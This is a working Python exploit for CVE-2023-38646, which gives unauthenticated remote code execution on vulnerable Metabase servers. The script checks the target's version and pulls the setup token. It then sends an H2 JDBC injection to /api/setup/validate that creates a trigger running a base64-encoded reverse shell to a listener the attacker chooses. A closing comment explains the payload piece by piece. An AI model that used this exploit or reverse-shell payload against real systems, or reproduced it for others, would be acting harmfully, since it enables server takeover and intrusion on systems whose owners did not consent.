"""
CVE-2023-38646
Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers 
to execute arbitrary commands on the server, at the server's privilege level. 
Authentication is not required for exploitation.
"""

import re
import sys
import json
import random
import string
import base64
import requests
from packaging import version

def check_response(target):
	try:
		response = requests.get(target, timeout=5)

		if response.status_code == 200:
			return response
		else:
			print(f"Unexpected status code: {response.status_code}")
			sys.exit(1)

	except requests.Timeout:
		print(f"Timeout: {target} did not respond in 5 seconds")
		sys.exit(1)
	except requests.RequestException as e:
		print(f"An errror ocurred: {e}")
		sys.exit(1)
	

def get_bootstrap_json_blob_from_html_resp(html):
    match = re.search(r'<script type="application/json" id="_metabaseBootstrap">([^>]+)</script>', html)
    if match:
        try:
        	# group(0) is the entire match. including all the html
        	# group(1) is the content in the first parenthesis
            return json.loads(match.group(1))
        except json.JSONDecodeError:
            print("Unable to parse JSON blob")
            return None
    else:
        print("No match found")
        return None


if __name__ == "__main__":

	if len(sys.argv) < 4:
		print("Missing some arguments: Target URI, Listener IP, or Listener Port")
	else:
		target_uri = sys.argv[1]

		# Get the json blob from the html response by calling our function
		response = check_response(target_uri)
		json_blob = get_bootstrap_json_blob_from_html_resp(response.text)

		# Get the version key and its nested tag key value. If the verison key doesn't exist default it to empty {}
		# if the tag key is not the default the value of the version key to None
		metabase_version = json_blob.get('version', {}).get('tag', None)

		# Check that hthe version is vulnerable by using version library
		if version.parse(metabase_version) < version.parse("0.46.6.1"):
			print("Version is vulnerable to RCE CVE-2023-38646")

			# get the setup_token
			setup_token = json_blob['setup-token']

			# If the setup-token is not found in the json of the target uri try the secondary location
			if not setup_token:
				secondary_target_uri = target_uri + "/api/session/properties"
				print("Setup token not found", "\n", f"Checking secondary location at {secondary_target_uri}")
				response = check_response(secondary_target_uri)
				json_blob = get_bootstrap_json_blob_from_html_resp(response.text)
				setup_token = json_blob['setup-token']

				# If the token is not in the secondary response then exit
				if not setup_token:
					print("Token not found")
					sys.exit(1)

			print("Sending exploit...")

			payload = f"sh -i >& /dev/tcp/{sys.argv[2]}/{sys.argv[3]} 0>&1"

			# payload.encode(): Convert string payload to bytes
    		# base64.b64encode(): Base64-encode the bytes
    		# .decode(): Convert the base64-encoded bytes back to a string
			base64_payload = base64.b64encode(payload.encode()).decode()

			# Our base64ed payload can't have = in it, so we'll pad out with spaces to remove them
			equals_count = base64_payload.count("=")

			if equals_count > 0:
				base64_payload = base64.b64encode((payload + ' ' * equals_count).encode()).decode().rstrip('=')

			data = json.dumps({
			    'token': setup_token,
			    'details': {
			        'details': {
			            'db': f"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {''.join(random.choice(string.ascii_letters) for i in range(8))} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{base64_payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
			            'advanced-options': False,
			            'ssl': True
			        },
			        'name': ''.join(random.choice(string.ascii_letters) for i in range(8)),
			        'engine': 'h2'
			    }
			})

			try:
				requests.post(target_uri + "/api/setup/validate", headers={'Content-Type': 'application/json'}, data=data, timeout=5)

			except requests.Timeout:
				print(f"Timeout: {target} did not respond in 5 seconds")
				sys.exit(1)

			except requests.RequestException as e:
				print(f"An errror ocurred: {e}")
				sys.exit(1)

		else:
			print("Version is NOT vulnerable to RCE CVE-2023-38646")

"""
Breakdown of the db key value in the json data for the POST request:

zip:/app/metabase.jar!/sample-database.db

This is the URI (Uniform Resource Identifier) that specifies where the database is located. 
It tells the H2 database engine to look inside the metabase.jar file in the /app directory for a file called sample-database.db. 
This is a zipped database, which H2 can handle.


TRACE_LEVEL_SYSTEM_OUT=0\\;

This sets the trace level for system output to 0, effectively turning off debug messages. 
\\; is the delimiter that separates multiple settings.


CREATE TRIGGER {''.join(random.choice(string.ascii_letters) for i in range(8))}

This starts defining a SQL trigger with a random name. In SQL databases, a "trigger" is a piece of code that automatically runs 
when a specified database event occurs.


BEFORE SELECT ON INFORMATION_SCHEMA.TABLES

Specifies that the trigger will fire before any SELECT operation on the INFORMATION_SCHEMA.TABLES table. 
This is generally a system table available in most SQL databases.

AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,#{b64_pe}}|{base64,-d}|{bash,-i}')\n$$--=x"

The payload to be executed.

    $$//javascript: Begins a JavaScript section.

    java.lang.Runtime.getRuntime().exec(...): Executes a shell command in the underlying system.

    ('bash -c {{echo,{base64_payload}}}|{{base64,-d}}|{{bash,-i}}'): This is the shell command to execute, 
    which will be Base64-decoded before running. Base64_payload holds the encoded payload).
   
    $$--=x: Ends the JavaScript section.

"""





